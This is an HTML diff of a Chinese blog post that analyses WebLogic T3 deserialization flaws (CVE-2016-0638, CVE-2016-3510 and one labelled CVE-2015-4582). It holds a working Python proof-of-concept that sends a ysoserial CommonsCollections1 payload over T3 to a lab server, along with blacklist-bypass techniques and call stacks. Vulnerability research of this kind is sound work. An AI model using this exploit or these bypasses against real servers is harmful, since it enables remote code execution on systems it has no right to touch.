class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">JNDI_FACTORY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HelloClient</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;172.16.80.136&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">7001</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ic</span> <span class="hljs-operator">=</span> getInitialContext(<span class="hljs-string">&quot;t3://&quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span> + port);<br>            <span class="hljs-type">IHello</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> (IHello) ic.lookup(<span class="hljs-string">&quot;HelloServer&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;Successfully connected to HelloServer on &quot;</span> +<br>                    host + <span class="hljs-string">&quot; at port &quot;</span> +<br>                    port + <span class="hljs-string">&quot;: &quot;</span> + obj.sayHello());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            System.err.println(<span class="hljs-string">&quot;An exception occurred: &quot;</span> + ex.getMessage());<br>            <span class="hljs-keyword">throw</span> ex;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> InitialContext <span class="hljs-title function_">getInitialContext</span><span class="hljs-params">(String url)</span><br>            <span class="hljs-keyword">throws</span> NamingException &#123;<br>        Hashtable&lt;String, String&gt; env = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;String, String&gt;();<br>        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);<br>        env.put(Context.PROVIDER_URL, url);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221127232543112.png'><img src="/2022/11/29/weblogic/image-20221127232543112.png" alt="image-20221127232543112"></p>
 <p>这里利用wireshark进行抓包分析</p>
-<p><img src="/2022/11/29/weblogic/image-20221128090141992.png" alt="image-20221128090141992"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128090141992.png'><img src="/2022/11/29/weblogic/image-20221128090141992.png" alt="image-20221128090141992"></p>
 <p>可以看到之前也会有一个tcp建立连接的阶段，客户端与服务器端双方会发送各自的版本信息，我们基于此可以进行weblogic的版本探测利用。开头可以构造形式如</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t3 10.3.6\nAS:255\nHL:19\nMS:10000000\n\n</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/11/29/weblogic/image-20221128090904001.png" alt="image-20221128090904001"></p>
-<p><img src="/2022/11/29/weblogic/image-20221128091050219.png" alt="image-20221128091050219"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">t3 10.3.6\nAS:255\nHL:19\nMS:10000000\n\n<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128090904001.png'><img src="/2022/11/29/weblogic/image-20221128090904001.png" alt="image-20221128090904001"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128091050219.png'><img src="/2022/11/29/weblogic/image-20221128091050219.png" alt="image-20221128091050219"></p>
 <p>这里可以看出<strong>T3协议由协议头包裹，且数据包中包含多个序列化的对象</strong>。因此我们的利用原理就是构造恶意对象并封装到数据包中重新发送了，送上流程图</p>
-<p><img src="/2022/11/29/weblogic/image-20221128091242911.png" alt="image-20221128091242911" style="zoom:50%;"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128091242911.png'><img src="/2022/11/29/weblogic/image-20221128091242911.png" alt="image-20221128091242911" style="zoom:50%;"></p>
 <h4 id="配置调试环境"><a href="#配置调试环境" class="headerlink" title="配置调试环境"></a>配置调试环境</h4><p>利用工具 <a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p>
 <p>注意iptables设置 idea设置远程调试</p>
-<p><img src="/2022/11/29/weblogic/image-20221127185707061.png" alt="image-20221127185707061"></p>
-<p><img src="/2022/11/29/weblogic/image-20221127185724397.png" alt="image-20221127185724397"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221127185707061.png'><img src="/2022/11/29/weblogic/image-20221127185707061.png" alt="image-20221127185707061"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221127185724397.png'><img src="/2022/11/29/weblogic/image-20221127185724397.png" alt="image-20221127185724397"></p>
 <h4 id="CVE-2015-4582"><a href="#CVE-2015-4582" class="headerlink" title="CVE-2015-4582"></a>CVE-2015-4582</h4><p><strong>POC:</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> calendar <span class="keyword">import</span> day_abbr</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct  <span class="comment"># 负责大小端的转换</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generatePayload</span>(<span class="params">gadget, cmd</span>):</span><br><span class="line">    YSO_PATH = <span class="string">&quot;D:\渗透\工具\利用\ysoserial-all.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen(</span><br><span class="line">        [<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, YSO_PATH, gadget, cmd], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Exploit</span>(<span class="params">ip, port, payload</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip, port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">compile</span> = re.<span class="built_in">compile</span>(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    match = <span class="built_in">compile</span>.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Weblogic: &quot;</span>+<span class="string">&quot;&quot;</span>.join(match))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="comment"># return</span></span><br><span class="line">    header = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>)</span><br><span class="line">    t3header = binascii.a2b_hex(</span><br><span class="line">        <span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)</span><br><span class="line">    desflag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>)</span><br><span class="line">    payload = header + t3header + desflag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;172.16.80.136&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections1&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;touch /tmp/success&quot;</span></span><br><span class="line">    payload = generatePayload(gadget, cmd)</span><br><span class="line">    T3Exploit(ip, port, payload)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> calendar <span class="hljs-keyword">import</span> day_abbr<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">import</span> struct  <span class="hljs-comment"># 负责大小端的转换</span><br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> stdout<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> binascii<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generatePayload</span>(<span class="hljs-params">gadget, cmd</span>):<br>    YSO_PATH = <span class="hljs-string">&quot;D:\渗透\工具\利用\ysoserial-all.jar&quot;</span><br>    popen = subprocess.Popen(<br>        [<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, YSO_PATH, gadget, cmd], stdout=subprocess.PIPE)<br>    <span class="hljs-keyword">return</span> popen.stdout.read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">T3Exploit</span>(<span class="hljs-params">ip, port, payload</span>):<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((ip, port))<br>    handshake = <span class="hljs-string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span><br><br>    sock.sendall(handshake.encode())<br>    data = sock.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">print</span>(data)<br><br>    <span class="hljs-built_in">compile</span> = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&quot;HELO:(.*).0.false&quot;</span>)<br>    match = <span class="hljs-built_in">compile</span>.findall(data.decode())<br>    <span class="hljs-keyword">if</span> match:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Weblogic: &quot;</span>+<span class="hljs-string">&quot;&quot;</span>.join(match))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Weblogic&quot;</span>)<br>        <span class="hljs-comment"># return</span><br>    header = binascii.a2b_hex(<span class="hljs-string">b&quot;00000000&quot;</span>)<br>    t3header = binascii.a2b_hex(<br>        <span class="hljs-string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)<br>    desflag = binascii.a2b_hex(<span class="hljs-string">b&quot;fe010000&quot;</span>)<br>    payload = header + t3header + desflag + payload<br>    payload = struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, <span class="hljs-built_in">len</span>(payload)) + payload[<span class="hljs-number">4</span>:]<br>    sock.send(payload)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    ip = <span class="hljs-string">&quot;172.16.80.136&quot;</span><br>    port = <span class="hljs-number">7001</span><br>    gadget = <span class="hljs-string">&quot;CommonsCollections1&quot;</span><br>    cmd = <span class="hljs-string">&quot;touch /tmp/success&quot;</span><br>    payload = generatePayload(gadget, cmd)<br>    T3Exploit(ip, port, payload)<br></code></pre></td></tr></table></figure>
 <p>这里存在一个问题就是刚开始发送版本探测包的时候并不能正常返回服务端版本信息，然而用wireshark抓包却可以抓到完整的版本信息。初步推测可能和操作系统版本有关</p>
-<p><img src="/2022/11/29/weblogic/image-20221128151417439.png" alt="image-20221128151417439"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128151417439.png'><img src="/2022/11/29/weblogic/image-20221128151417439.png" alt="image-20221128151417439"></p>
 <p>利用CC1进行反序列化利用最终在<code>/tmp</code>目录下生成success文件</p>
-<p><img src="/2022/11/29/weblogic/image-20221128151523504.png" alt="image-20221128151523504"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128151523504.png'><img src="/2022/11/29/weblogic/image-20221128151523504.png" alt="image-20221128151523504"></p>
 <ul>
 <li><p>漏洞分析</p>
 <p>序列化数据进入的函数入口在<code>weblogic.rjvm.InboundMsgAbbrev#readObject()</code>，可以看到里面调用了<code>InboundMsgAbbrev.ServerChannelInputStream#readObject()</code></p>
-<p><img src="/2022/11/29/weblogic/image-20221128151809466.png" alt="image-20221128151809466"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128151809466.png'><img src="/2022/11/29/weblogic/image-20221128151809466.png" alt="image-20221128151809466"></p>
 <p>进入该内部类，其继承于<code>ObjectInputStream</code>类，并重写了<code>resolveClass()</code>方法，但是可以看到，其中仍会调用父类的方法且未作过滤检验。该方法也是原生反序列化漏洞的触发点</p>
-<p><img src="/2022/11/29/weblogic/image-20221128152427037.png" alt="image-20221128152427037"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128152427037.png'><img src="/2022/11/29/weblogic/image-20221128152427037.png" alt="image-20221128152427037"></p>
 </li>
 <li><p>关于resolveClass方法</p>
 <p>从类序列化描述符获取类的Class对象。从类描述中获取到了全限定类名，然后利用反射根据全限定类名来获取到对应的 Class 对象并且进行返回。所以这里也是最好做防御的地方，检查一下该类的<strong>序列化描述符</strong>中记录的类名是否在黑名单上，如果在黑名单上，直接抛出错误，不允许获取恶意的类的Class对象。这样以来，恶意类连生成Class对象的机会都没有</p>
@@ -259,54 +88,54 @@
 </li>
 </ul>
 <h4 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h4><p>绕过了resolveClass中黑名单限制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.collections.functors* *</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax* *</span><br><span class="line">javassist* *</span><br><span class="line">org.codehaus.groovy.runtime.ConvertedClosure</span><br><span class="line">org.codehaus.groovy.runtime.ConversionHandler</span><br><span class="line">org.codehaus.groovy.runtime.MethodClosure</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs blacklist">org.apache.commons.collections.functors* *<br>com.sun.org.apache.xalan.internal.xsltc.trax* *<br>javassist* *<br>org.codehaus.groovy.runtime.ConvertedClosure<br>org.codehaus.groovy.runtime.ConversionHandler<br>org.codehaus.groovy.runtime.MethodClosure<br></code></pre></td></tr></table></figure>
 <p>利用类<code>weblogic.jms.common.StreamMessageImpl</code>中的<code>readExternal()</code>，该方法对输入流进行了二次反序列化</p>
-<p><img src="/2022/11/29/weblogic/image-20221128162249221.png" alt="image-20221128162249221"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128162249221.png'><img src="/2022/11/29/weblogic/image-20221128162249221.png" alt="image-20221128162249221"></p>
 <ul>
 <li><p>利用 <a target="_blank" rel="noopener" href="https://github.com/5up3rc/weblogic_cmd">https://github.com/5up3rc/weblogic_cmd</a></p>
-<p><img src="/2022/11/29/weblogic/image-20221128182519156.png" alt="image-20221128182519156"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128182519156.png'><img src="/2022/11/29/weblogic/image-20221128182519156.png" alt="image-20221128182519156"></p>
 <p><strong>工具分析</strong></p>
 <p><code>com.supeream.Main#executeBlind()</code>获取参数，然后执行<code>WebLogicOperation.blindExecute()</code></p>
-<p><img src="/2022/11/29/weblogic/image-20221128182637643.png" alt="image-20221128182637643"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128182637643.png'><img src="/2022/11/29/weblogic/image-20221128182637643.png" alt="image-20221128182637643"></p>
 <p>其中给命令赋值，并根据参数os来决定使用的系统命令，接下来进入<code>SerialDataGenerator.serialBlindDatas()</code></p>
-<p><img src="/2022/11/29/weblogic/image-20221128182803106.png" alt="image-20221128182803106"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128182803106.png'><img src="/2022/11/29/weblogic/image-20221128182803106.png" alt="image-20221128182803106"></p>
 <p>首先会在<code>SerialDataGenerator#blindExecutePayloadTransformerChain()</code>构建恶意反序列化对象，可以看到就是构建的CC1利用链</p>
-<p><img src="/2022/11/29/weblogic/image-20221128183106601.png" alt="image-20221128183106601"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128183106601.png'><img src="/2022/11/29/weblogic/image-20221128183106601.png" alt="image-20221128183106601"></p>
 <p>之后进入<code>serialData()</code>，继续构造CC1链。之后进入<code>BypassPayloadSelector.selectBypass()</code></p>
-<p><img src="/2022/11/29/weblogic/image-20221128183243076.png" alt="image-20221128183243076"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128183243076.png'><img src="/2022/11/29/weblogic/image-20221128183243076.png" alt="image-20221128183243076"></p>
 <p>这里可以看到我们熟悉的用来绕过黑名单的利用类streamMessageImpl，如果Main.TYPE参数未指明，那么默认就是streamMessageImpl。</p>
-<p><img src="/2022/11/29/weblogic/image-20221128183406376.png" alt="image-20221128183406376"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128183406376.png'><img src="/2022/11/29/weblogic/image-20221128183406376.png" alt="image-20221128183406376"></p>
 <p>同时，这里可以看到会先对payload对象进行一次序列化，并封装到streamMessageImpl的buffer属性数组当中</p>
-<p><img src="/2022/11/29/weblogic/image-20221128183716501.png" alt="image-20221128183716501"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128183716501.png'><img src="/2022/11/29/weblogic/image-20221128183716501.png" alt="image-20221128183716501"></p>
 <p>进一步，会再对streamMessageImpl对象进行一次序列化，形成最终的JAVA序列化数据</p>
-<p><img src="/2022/11/29/weblogic/image-20221128183743432.png" alt="image-20221128183743432"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128183743432.png'><img src="/2022/11/29/weblogic/image-20221128183743432.png" alt="image-20221128183743432"></p>
 <p>最终会在<code>T3ProtocolOperation#send()</code>中将JAVA序列化数据拼接如T3协议数据中，与前面漏洞的构造原理一致</p>
 </li>
 <li><p><strong>服务端部分分析</strong></p>
 <p>刚开始与之前的漏洞调用过程一致，也会进入<code>InboundMsgAbbrev.ServerChannelInputStream()</code></p>
-<p><img src="/2022/11/29/weblogic/image-20221128184050013.png" alt="image-20221128184050013"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128184050013.png'><img src="/2022/11/29/weblogic/image-20221128184050013.png" alt="image-20221128184050013"></p>
 <p>由于我这里没有用的补丁调试，所以看不出黑名单的拦截过程。但是最终会通过到<code>StreamMessageImpl#readExternal</code>，而不再走之前ServerChannelInputStream中readObject之后的路，后者设置了一系列黑名单拦截。而在<code>StreamMessageImpl#readExternal()</code>中会进一步调用本身的readObject进行二次反序列化（也就是我们之前序列化时的buffer数组中的内容），最终触发CC1</p>
-<p><img src="/2022/11/29/weblogic/image-20221128184602007.png" alt="image-20221128184602007"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221128184602007.png'><img src="/2022/11/29/weblogic/image-20221128184602007.png" alt="image-20221128184602007"></p>
 </li>
 <li><p>整体调用栈</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">- readObject:331, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">  invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">  invoke:57, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">  invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">  invoke:601, Method (java.lang.reflect)</span><br><span class="line">  invokeReadObject:1004, ObjectStreamClass (java.io)</span><br><span class="line">  readSerialData:1891, ObjectInputStream (java.io)</span><br><span class="line">  readOrdinaryObject:1796, ObjectInputStream (java.io)</span><br><span class="line">  readObject0:1348, ObjectInputStream (java.io)</span><br><span class="line">  readObject:370, ObjectInputStream (java.io)</span><br><span class="line">- readExternal:1419, StreamMessageImpl (weblogic.jms.common)</span><br><span class="line">  readExternalData:1835, ObjectInputStream (java.io)</span><br><span class="line">  readOrdinaryObject:1794, ObjectInputStream (java.io)</span><br><span class="line">  readObject0:1348, ObjectInputStream (java.io)</span><br><span class="line">  readObject:370, ObjectInputStream (java.io)</span><br><span class="line">  readObject:66, InboundMsgAbbrev (weblogic.rjvm)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">- readObject:331, AnnotationInvocationHandler (sun.reflect.annotation)<br>  invoke0:-1, NativeMethodAccessorImpl (sun.reflect)<br>  invoke:57, NativeMethodAccessorImpl (sun.reflect)<br>  invoke:43, DelegatingMethodAccessorImpl (sun.reflect)<br>  invoke:601, Method (java.lang.reflect)<br>  invokeReadObject:1004, ObjectStreamClass (java.io)<br>  readSerialData:1891, ObjectInputStream (java.io)<br>  readOrdinaryObject:1796, ObjectInputStream (java.io)<br>  readObject0:1348, ObjectInputStream (java.io)<br>  readObject:370, ObjectInputStream (java.io)<br>- readExternal:1419, StreamMessageImpl (weblogic.jms.common)<br>  readExternalData:1835, ObjectInputStream (java.io)<br>  readOrdinaryObject:1794, ObjectInputStream (java.io)<br>  readObject0:1348, ObjectInputStream (java.io)<br>  readObject:370, ObjectInputStream (java.io)<br>  readObject:66, InboundMsgAbbrev (weblogic.rjvm)<br></code></pre></td></tr></table></figure>
 </li>
 </ul>
 <h4 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h4><p>与CVE-2016-0638原理一致，都是基于黑名单的绕过。这里用的是<code>weblogic.corba.utils.MarshalledObject</code>类</p>
 <p>我们还是先看exp，其因为TYPE改成了marshall，所以会将payload(也就是恶意AnnotationInvocationHandler对象)作为参数传入marshalledObject方法。</p>
-<p><img src="/2022/11/29/weblogic/image-20221129212145340.png" alt="image-20221129212145340"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221129212145340.png'><img src="/2022/11/29/weblogic/image-20221129212145340.png" alt="image-20221129212145340"></p>
 <p>跟入可以看到序列化的恶意payload会被写入objBytes成员变量中</p>
-<p><img src="/2022/11/29/weblogic/image-20221129212342511.png" alt="image-20221129212342511"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221129212342511.png'><img src="/2022/11/29/weblogic/image-20221129212342511.png" alt="image-20221129212342511"></p>
 <ul>
 <li><p>反序列化分析</p>
 <blockquote>
 <p>weblogic.corba.utils.MarshalledObject这个类没有实现readObject或者readExternal函数，所以在反序列化的时候采用ObjectInputStream的默认流程。但这个流程<strong>会调用辅助类ObjectStreamClass的invokeReadResolve函数</strong>，后者<strong>会调用MarshalledObject的readResolve函数</strong>，查看readResolve我们会发现，readResolve中有readObject的调用，而其参数正来自其本身的objBytes变量</p>
 </blockquote>
-<p><img src="/2022/11/29/weblogic/image-20221129212642533.png" alt="image-20221129212642533"></p>
-<p><img src="/2022/11/29/weblogic/image-20221129212902361.png" alt="image-20221129212902361"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221129212642533.png'><img src="/2022/11/29/weblogic/image-20221129212642533.png" alt="image-20221129212642533"></p>
+<p class='item-img' data-src='/2022/11/29/weblogic/image-20221129212902361.png'><img src="/2022/11/29/weblogic/image-20221129212902361.png" alt="image-20221129212902361"></p>
 </li>
 <li><p>调用链如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">readObject:331, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:57, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:601, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1004, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1891, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1796, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1348, ObjectInputStream (java.io)</span><br><span class="line">readObject:370, ObjectInputStream (java.io)</span><br><span class="line">readResolve:58, MarshalledObject (weblogic.corba.utils)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:57, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:601, Method (java.lang.reflect)</span><br><span class="line">invokeReadResolve:1091, ObjectStreamClass (java.io)</span><br><span class="line">readOrdinaryObject:1805, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1348, ObjectInputStream (java.io)</span><br><span class="line">readObject:370, ObjectInputStream (java.io)</span><br><span class="line">readObject:66, InboundMsgAbbrev (weblogic.rjvm)</span><br></pre></td></tr></table></figure>
